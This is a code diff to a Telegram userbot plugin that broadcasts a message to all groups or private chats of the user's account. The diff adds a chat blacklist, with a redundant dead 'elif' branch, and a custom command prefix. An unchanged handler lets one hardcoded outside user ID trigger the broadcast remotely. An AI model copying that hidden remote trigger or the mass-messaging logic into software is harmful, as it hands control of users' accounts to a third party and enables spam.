@@ -10,15 +10,17 @@
 # FROM Man-Userbot <https://github.com/mrismanaziz/Man-Userbot>
 # t.me/SharingUserbot & t.me/Lunatic0de
 
-from userbot import CMD_HELP
+from userbot import CMD_HELP, CMD_HANDLER as cmd
+from userbot.utils import kyy_cmd
 from userbot.events import register
 
 GCAST_BLACKLIST = [
     -1001638078842,  # RuangDiskusi
+
 ]
 
 
-@register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
+@kyy_cmd(pattern="gcast(?: |$)(.*)")
 @register(incoming=True, from_users=1441342342,
           pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
@@ -37,8 +39,11 @@ async def gcast(event):
         if x.is_group:
             chat = x.id
             try:
-                await event.client.send_message(chat, msg)
-                done += 1
+                if chat not in GCAST_BLACKLIST:
+                    await event.client.send_message(chat, msg)
+                    done += 1
+                elif chat not in GCAST_BLACKLIST:
+                    pass
             except BaseException:
                 er += 1
     await kk.edit(
@@ -46,7 +51,7 @@ async def gcast(event):
     )
 
 
-@register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
+@kyy_cmd(pattern="gucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -74,8 +79,8 @@ async def gucast(event):
 
 CMD_HELP.update(
     {
-        "gcast": "**Plugin : **`gcast`\
-        \n\n  •  **Syntax :** `.gcast` <text/reply media>\
+        "gcast": f"**Plugin : **`gcast`\
+        \n\n  •  **Syntax :** `{cmd}gcast` <text/reply media>\
         \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Grup yang kamu masuk. (Bisa Mengirim Media/Sticker)\
     "
     }
@@ -84,8 +89,8 @@ CMD_HELP.update(
 
 CMD_HELP.update(
     {
-        "gucast": "**Plugin : **`gucast`\
-        \n\n  •  **Syntax :** `.gucast` <text/reply media>\
+        "gucast": f"**Plugin : **`gucast`\
+        \n\n  •  **Syntax :** `{cmd}gucast` <text/reply media>\
         \n  •  **Function : **Mengirim Global Broadcast pesan ke Seluruh Private Massage / PC yang masuk. (Bisa Mengirim Media/Sticker)\
     "
     }
